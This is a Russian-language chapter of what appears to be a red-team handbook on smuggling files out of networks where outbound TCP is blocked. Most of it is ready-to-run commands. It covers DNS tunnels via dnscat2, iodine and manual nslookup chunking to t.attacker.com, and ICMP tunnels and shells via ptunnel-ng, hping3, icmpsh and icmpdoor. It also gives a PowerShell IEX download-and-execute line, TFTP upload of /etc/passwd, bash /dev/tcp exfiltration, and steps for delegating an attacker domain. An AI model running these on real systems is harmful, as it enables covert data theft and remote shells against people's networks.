# 12 - DNS / ICMP / TFTP: как протащить файл

> [← README](../../README_RU.md) · [Следующий раздел →](13-stegano.md)

Когда исходящий TCP закрыт, а DNS (53/udp) или ICMP (ping) ещё ходят. Каналы медленные: гоняем ключи, конфиги, небольшие архивы. Перед отправкой всегда: **сжать -> зашифровать -> передать -> сверить sha256** ([11](11-encryption.md)).

```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export DOMAIN=t.attacker.com
export SECRET='MyStr0ngSecret'
```

```cmd
:: Windows CMD
set LHOST=192.168.2.5
set RHOST=192.168.10.20
set DOMAIN=t.attacker.com
set SECRET=MyStr0ngSecret
```

## Быстрый выбор

| Что есть на цели | Чем тащить | Скорость |
|---|---|---|
| Можно положить бинарь | `dnscat2` (DNS) / `ptunnel-ng` (ICMP) | низкая |
| Нужен обычный IP-туннель (scp/ssh) | `iodine` | до ~1 Мбит/с |
| Только `nslookup` / `dig` | DNS вручную | очень низкая |
| Только `ping` / `hping3` | ICMP payload | очень низкая |
| Открыт 69/udp | TFTP | средняя |
| Только `bash` | `/dev/tcp` | средняя |

---

# DNS

## dnscat2

Сервер - Ruby, клиенты - Linux/Windows. Шифрует трафик, умеет `upload`/`download` и шелл.

**Сборка (LHOST):**

```bash
sudo apt install -y ruby ruby-dev git build-essential
git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/server
gem install bundler && bundle install

cd ../client
make                                  # Linux-клиент
make clean && make CC="cc -static"    # статический клиент (если нужно)
```

> Готовые клиенты для Windows/Linux лежат на `https://downloads.skullsecurity.org/dnscat2/` (zip-пароль `password`). Кросс-сборка через mingw возможна, но зависит от версии Makefile и mingw; для практики проще взять готовый `dnscat2.exe`.

**Сервер:**

```bash
# через свой домен (нужна NS-запись t.attacker.com -> LHOST)
sudo ruby dnscat2.rb t.attacker.com

# напрямую по IP, без домена
sudo ruby dnscat2.rb --dns "host=0.0.0.0,port=53" --no-cache

# свой secret (сервер напечатает его при старте)
sudo ruby dnscat2.rb --secret "$SECRET" $DOMAIN
```

**Клиент:**

```bash
# Linux: через домен
./dnscat2 --secret="$SECRET" $DOMAIN

# Linux: напрямую на наш IP
./dnscat2 --secret="$SECRET" --dns server=$LHOST,port=53

# Windows
dnscat2.exe --secret=%SECRET% --dns server=%LHOST%,port=53

# проверить связь без сессии
./dnscat2 --ping $DOMAIN
```

> `$SECRET` / `%SECRET%` — значение, которое сервер печатает при старте (или то, что задано через `--secret`). Оно должно совпадать на клиенте и сервере.

**Работа с сессией (в консоли сервера):**

```text
windows                 # список сессий
window -i 1             # войти в сессию
shell                   # шелл на цели

# файлы
upload /root/tool.exe C:\Users\Public\tool.exe
download C:\Users\Public\secrets.zip secrets.zip

# проброс порта
listen 127.0.0.1:2222 10.10.10.10:22
```

**PowerShell-клиент (без exe):**

```powershell
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
Start-Dnscat2 -Domain t.attacker.com -PreSharedSecret 'MyStr0ngSecret'
Start-Dnscat2 -Domain t.attacker.com -Exec cmd
```

> Для PowerShell-клиента сервер запускать с `--no-cache`.

## iodine (IP поверх DNS)

Даёт tun-интерфейс: внутри работают `ping`, `scp`, `ssh`, `nc`. Сам трафик **не шифрует** - поверх гоняем SSH.

```bash
sudo apt install -y iodine
sudo modprobe tun                    # Linux-клиенту и серверу нужен tun

# LHOST: сервер, 10.0.0.1 - адрес внутри туннеля
sudo iodined -f -c -P 'secretpassword' 10.0.0.1 $DOMAIN

# RHOST: клиент (получит 10.0.0.2)
sudo iodine -f -P 'secretpassword' $DOMAIN

# проверка
ping 10.0.0.1

# эксфил файла через туннель
scp secrets.zip 10.0.0.1:/tmp/
```

> Windows-клиенту `iodine` нужен TAP-драйвер (обычно TAP-Windows от OpenVPN). На Windows проще `dnscat2` или `ptunnel-ng`.

## DNS вручную (только nslookup/dig)

Данные кладём в поддомены, на LHOST ловим запросы.

```bash
# LHOST: слушаем DNS-имена и пишем лог для сборки
sudo tcpdump -i any -n -s0 udp port 53 -l | tee dns.log | grep --line-buffered '\.t\.attacker\.com'
```

```bash
# RHOST: файл -> hex -> куски по 30 символов -> DNS-запросы
i=0
for chunk in $(xxd -p secrets.zip | tr -d '\n' | fold -w30); do
  nslookup "$i.$chunk.t.attacker.com" $LHOST >/dev/null
  i=$((i+1))
done
```

```bash
# LHOST: собрать из лога tcpdump
grep -oE '[0-9]+\.[0-9a-f]+\.t\.attacker\.com' dns.log \
  | sort -u | sort -t. -k1,1n | cut -d. -f2 | tr -d '\n' | xxd -r -p > secrets.zip
sha256sum secrets.zip
```

> Для DNS-имён лучше base32: без регистра и спецсимволов. См. [10](10-encoding.md#base32).

## dnsteal

Готовый фейковый DNS-сервер: принимает файл частями и складывает у себя. Нужен Python 2.

```bash
git clone https://github.com/m57/dnsteal && cd dnsteal
sudo python2 dnsteal.py $LHOST -z -v
# dnsteal напечатает готовую команду для цели - копируем и выполняем на RHOST
```

> На цели нужен `dig` (или адаптируйте напечатанную команду под `nslookup`).

---

# ICMP

## ptunnel-ng (TCP поверх ping)

```bash
sudo apt install -y build-essential automake autoconf libtool libpcap-dev git
git clone https://github.com/utoni/ptunnel-ng && cd ptunnel-ng
./autogen.sh && ./configure && make
```

**Эксфил RHOST -> LHOST:**

```bash
# LHOST: proxy + приём файла
sudo ./src/ptunnel-ng -r127.0.0.1 -R9000
nc -lvnp 9000 > secrets.zip
```

```bash
# RHOST: локальный 8000 -> ICMP -> LHOST:9000
sudo ./src/ptunnel-ng -p$LHOST -l8000 -r127.0.0.1 -R9000
nc -w3 127.0.0.1 8000 < secrets.zip
```

```cmd
:: Windows-клиент (админ + Npcap)
ptunnel-ng.exe -p%LHOST% -l8000 -r127.0.0.1 -R9000
```

> `-r127.0.0.1` — адрес, куда proxy форвардит TCP; `nc` слушает этот порт на LHOST. Пароль на proxy: `-P<password>` с обеих сторон. Для SSH замените `-R9000` на `-R22` с обеих сторон и подключайтесь: `ssh -p8000 user@127.0.0.1`.

## ICMP вручную (payload в ping)

```bash
# LHOST: смотрим, что ICMP-payload вообще ходит (только диагностика)
sudo tcpdump -i any -nn -s0 -X 'icmp and icmp[icmptype]==8' -l
```

```bash
# RHOST: шлём файл кусками (hping3)
sudo apt install -y hping3
sudo hping3 -1 -E secrets.zip -d 1400 -u $LHOST
```

**Вариант с повтором потерянных пакетов:**

```bash
# LHOST
sudo hping3 $LHOST --listen signature --safe --icmp > secrets.zip

# RHOST
sudo hping3 $LHOST -1 -E secrets.zip --sign signature --safe
```

> `--safe` медленнее, но не нужно вручную склеивать payload: hping3 сам отбрасывает signature и повторяет потерянные пакеты.

**Мелочь в одном пакете:**

```bash
sudo apt install -y nmap            # nping входит в nmap
sudo nping --icmp -c1 --data-string "$(id)" $LHOST
ping -c1 -p $(echo -n "hi" | xxd -p) $LHOST   # максимум 16 байт
```

## ICMP на Python: icmp_send.py / icmp_recv.py

Готовый канал для эксфила: отправитель шлёт файл в ICMP echo request, приёмник собирает куски по индексам и проверяет SHA-256. Скрипты лежат в [scripts/icmp/](../../scripts/icmp/).

**Как устроено:**

```text
ICMP-заголовок (8 B)
payload: session_id (4 B) + packet_idx (4 B) + data
пакет #0: file_size (8 B) + sha256 (32 B)
пакеты #1..N: куски файла по 1400 B
```

Отправителю нужен только Python 3 и root (raw-сокет). Приёмнику - Python 3, `scapy` и root (sniff).

**Установка и запуск:**

```bash
# LHOST: приёмник (команды из корня репозитория)
sudo apt install -y python3-scapy     # или: python3 -m pip install scapy
sudo python3 scripts/icmp/icmp_recv.py -o secrets.zip

# RHOST: отправитель (во втором окне, после запуска приёмника)
sudo python3 icmp_send.py $LHOST secrets.zip
```

```bash
# если скрипта на цели нет - скопировать локальный scripts/icmp/icmp_send.py
# любым доступным каналом (scp/SMB/HTTP) и запустить:
sudo python3 icmp_send.py $LHOST secrets.zip
```

**Опции отправителя:**

| Флаг | По умолчанию | Что делает |
|---|---|---|
| `target` | `10.0.2.10` | IP приёмника |
| `file` | - | файл для отправки |
| `-c, --chunk` | `1400` | размер данных в одном пакете |
| `-d, --delay` | `0.005` | пауза между пакетами, сек |
| `-r, --retries` | `0` | зарезервировано, повтор пока не реализован |

**Опции приёмника:**

| Флаг | По умолчанию | Что делает |
|---|---|---|
| `-o, --output` | `received_file.bin` | куда сохранить файл |
| `-t, --timeout` | `30` | сколько секунд тишины ждать до сохранения частичного файла |
| `--iface` | все интерфейсы | на каком интерфейсе слушать |

**Примеры:**

```bash
# плохой канал: меньше пакет, больше пауза
sudo python3 icmp_send.py $LHOST secrets.zip -c 512 -d 0.05

# локальная сеть: быстро
sudo python3 icmp_send.py $LHOST secrets.zip -c 1400 -d 0

# приём на конкретном интерфейсе, частичный файл через 10 секунд тишины
sudo python3 icmp_recv.py -o loot.zip -t 10 --iface eth0

# доставка на цель: приёмник на RHOST, отправитель на LHOST
# RHOST:
sudo python3 icmp_recv.py -o tool.zip
# LHOST:
sudo python3 icmp_send.py $RHOST tool.zip
```

**Что важно:**

- **Нет ACK и повторов.** Потерянный пакет - дырка в файле. Приёмник печатает пропущенные индексы, сохраняет что есть и возвращает код `2` (несовпадение hash или размера тоже даёт `2`). Для надёжности: `-c 512 -d 0.05` или `ptunnel-ng` / `hping3 --safe`.
- **Пакет #0 отправляется один раз.** Если он потерялся, приёмник не знает размер и SHA-256 и завершится только по таймауту `-t`. Если metadata дошла, а первый data-пакет потерялся, таймаут всё равно сохранит частичный файл и вернёт `2`.
- **MTU:** `1400 + 16` байт заголовков всё ещё влезает в 1500. Через VPN/туннель уменьшайте до `1200` или `512`.
- **Один запуск - один файл.** Приёмник завершается после приёма или таймаута, поэтому запускайте его **до** отправителя.
- **Права:** root/Administrator с обеих сторон. На Windows приёмнику нужен Npcap, отправителю - запуск от админа.
- Файл проверяется автоматически: приёмник печатает `SHA-256 matches` или `SHA-256 MISMATCH`.

**Если не работает:**

| Симптом | Причина | Решение |
|---|---|---|
| `PermissionError: Root privileges required` | нет root | `sudo` |
| `ModuleNotFoundError: scapy` | нет scapy или `sudo` его не видит | `sudo apt install python3-scapy` или `sudo python3 -m pip install scapy` |
| приёмник молчит | не тот интерфейс / ICMP режется | `--iface eth0`, проверить `ping $LHOST` и `tcpdump -ni any icmp` |
| часть пакетов missing | слишком большой chunk / маленькая пауза | `-c 512 -d 0.05`, повторить |
| `SHA-256 MISMATCH` | потеря/подмена пакетов | повторить передачу, уменьшить chunk |
| `No data received` | пакеты не дошли | проверить IP, firewall, NAT/VM-сеть |

## icmpsh / icmpdoor (шелл по ICMP)

```bash
# LHOST: icmpsh
git clone https://github.com/inquisb/icmpsh && cd icmpsh
python2 -m pip install impacket
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
python2 icmpsh_m.py $LHOST $RHOST
```

> `icmpsh` — Python 2 и `impacket`; на современных системах удобнее отдельный контейнер.

```cmd
:: RHOST
icmpsh.exe -t %LHOST%
```

```bash
# после работы вернуть ядро в норму
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

```bash
# icmpdoor (Python 3 + scapy)
git clone https://github.com/krabelize/icmpdoor && cd icmpdoor
pip install scapy

# LHOST
sudo ./icmp-cnc.py -i eth0 -d $RHOST
# RHOST
sudo ./icmpdoor.py -i eth0 -d $LHOST
```

---

# TFTP (69/udp)

```bash
# LHOST: сервер
sudo apt install -y atftpd
sudo mkdir -p /tftp && sudo chmod 777 /tftp
sudo atftpd --daemon --port 69 /tftp
```

```cmd
:: RHOST (Windows): сначала включите TFTP-клиент (admin; может потребоваться reboot)
Enable-WindowsOptionalFeature -Online -FeatureName TFTP -All

:: RHOST (Windows): скачать с LHOST
tftp -i %LHOST% GET nc.exe C:\Users\Public\nc.exe

:: RHOST: отправить на LHOST
tftp -i %LHOST% PUT C:\Users\Public\secrets.zip secrets.zip

:: cleanup: отключите TFTP, если включали его для этой передачи
Disable-WindowsOptionalFeature -Online -FeatureName TFTP -NoRestart
```

```bash
# RHOST (Linux)
sudo apt install -y tftp-hpa
tftp $LHOST -c get payload.sh
tftp $LHOST -c put /etc/passwd passwd
```

> Корень TFTP — `/tftp`, а не `/tmp/share`; положите туда файл для раздачи. На Windows `-i` обязателен для бинарных файлов, а сам `tftp.exe` — отключаемый компонент Windows. TFTP не даёт авторизации и шифрования, поэтому подходит только для лаборатории или доверенного сегмента. Каталог сервера должен быть доступен на запись для загрузки (`PUT`); пайплайн использует `chmod 777` для лаборатории. Отключите компонент Windows после передачи, если он не был включён раньше.

---

# bash /dev/tcp и /dev/udp

Работает, только если `sh` - это bash. Проверка: `ls -la /bin/sh`.

**Скачать файл без wget/curl:**

```bash
# LHOST
python3 -m http.server 8000
```

```bash
# RHOST
exec 3<>/dev/tcp/$LHOST/8000
printf 'GET /payload.sh HTTP/1.0\r\nHost: %s\r\n\r\n' "$LHOST" >&3
sed '1,/^\r\{0,1\}$/d' <&3 > payload.sh
exec 3<&-; exec 3>&-
```

**Эксфил по TCP:**

```bash
# LHOST
nc -lvnp 9001 > secrets.tar.gz
```

```bash
# RHOST
cat secrets.tar.gz > /dev/tcp/$LHOST/9001
```

**По UDP (только мелочь, доставка не гарантируется):**

```bash
# LHOST
nc -u -lvnp 9002 > out.bin

# RHOST
cat secrets.txt > /dev/udp/$LHOST/9002
```

---

# Свой домен для DNS-туннеля

Нужен, когда цель ходит только через свой резолвер, а прямой DNS к чужому IP режется.

1. Купить домен и поднять VPS с белым IP.
2. Открыть 53/udp и выключить системный stub-резолвер:

```bash
sudo ufw allow 53/udp
sudo sed -i 's/#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved
```

3. У регистратора добавить две записи:

| Тип | Имя | Значение |
|---|---|---|
| `A` | `ns1` | `<IP_VPS>` |
| `NS` | `t` | `ns1.attacker.com` |

`A ns1` — glue-адрес нашего NS, `NS t` — делегирование подзоны `t.attacker.com` на этот сервер.

> NS-записи могут обновляться не сразу. Если `dig +trace` ещё показывает старого провайдера — подождите или проверьте TTL.

4. Запустить сервер на VPS:

```bash
sudo ruby dnscat2.rb t.attacker.com
# или
sudo iodined -f -c -P 'secretpassword' 10.0.0.1 t.attacker.com
```

> dnscat2 и iodine оба слушают 53/udp. Не запускайте их одновременно на одном IP/порту — используйте разные поддомены/VPS или нестандартный порт.

5. Проверить делегирование с другой машины:

```bash
dig NS t.attacker.com +short
dig +trace any.t.attacker.com
dig any.t.attacker.com @8.8.8.8
sudo tcpdump -ni any udp port 53
```

6. С цели ходить через домен, без `server=`:

```bash
./dnscat2 --secret="$SECRET" t.attacker.com
```

---

# Если не работает

| Симптом | Причина | Что делать |
|---|---|---|
| dnscat2: сессии нет | не совпал `--secret` / 53 не доходит / нет `--no-cache` | проверить секрет, `tcpdump`, добавить `--no-cache` |
| direct-режим не работает | egress режет DNS к чужому IP | перейти на свой домен + NS |
| порт 53 занят | systemd-resolved / dnsmasq | `--dnsport 5353` или освободить 53 |
| iodine: `SERVFAIL` | резолвер таймаутит | `-I1`, проверить NS и 53/udp |
| iodine: клиент и сервер не соединяются | разные версии / пароль / домен | одинаковые версии, сверить `-P` и домен |
| туннель отвалился | iodine закрывает сессию после ~60 с тишины | перезапустить клиент |
| ptunnel-ng не поднимается | нет root/Npcap или ICMP не ходит | root, Npcap, проверить `ping $LHOST` |
| TFTP: `Permission denied` | нет прав на запись в каталог сервера | `chmod 777 /tftp` для лаборатории, проверьте владельца |
| ICMP-канал не встаёт | нет root/Administrator или Npcap | запустить от админа, поставить Npcap |
| файл битый | потеря/перестановка пакетов | сжать, нумеровать куски, сверить sha256 |

**Мини-чек-лист:** сжал -> зашифровал -> передал -> `sha256sum -c` -> удалил временные файлы.

---

[← Назад к справочнику](../../README_RU.md)
